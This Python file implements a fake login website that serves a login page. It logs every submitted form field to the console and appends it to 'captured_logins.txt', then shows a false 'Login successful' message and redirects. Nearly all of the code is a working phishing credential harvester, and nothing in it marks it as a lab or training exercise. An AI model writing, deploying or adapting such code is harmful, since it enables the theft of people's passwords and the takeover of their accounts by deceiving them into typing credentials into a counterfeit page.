from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import os

class FakeSiteHandler(BaseHTTPRequestHandler):

    def send_html_response(self, html, status=200):
        self.send_response(status)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            base_path = os.path.dirname(os.path.abspath(__file__))
            html_path = os.path.join(base_path, "templates", "login.html")
            try:
                with open(html_path, "r") as f:
                    html = f.read()
                self.send_html_response(html)
            except FileNotFoundError:
                self.send_html_response("<h2>Login page not found.</h2>", status=404)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def do_POST(self):
        if self.path in ('/', '/log'):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode(errors='ignore')
            form = urllib.parse.parse_qs(post_data)

            print("[+] Captured credentials:")
            with open("captured_logins.txt", "a") as f:
                for key, value in form.items():
                    line = f"{key}: {value[0]}"
                    print("   ", line)
                    f.write(line + "\n")
                f.write("-" * 50 + "\n")

            html = """<html><body><h2>Login successful! Redirecting...</h2>
                      <script>setTimeout(() => { window.location.href = '/'; }, 3000);</script>
                      </body></html>"""
            self.send_html_response(html)
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")

def run(server_class=HTTPServer, handler_class=FakeSiteHandler, port=80):
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    print(f"[+] Fake login site running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
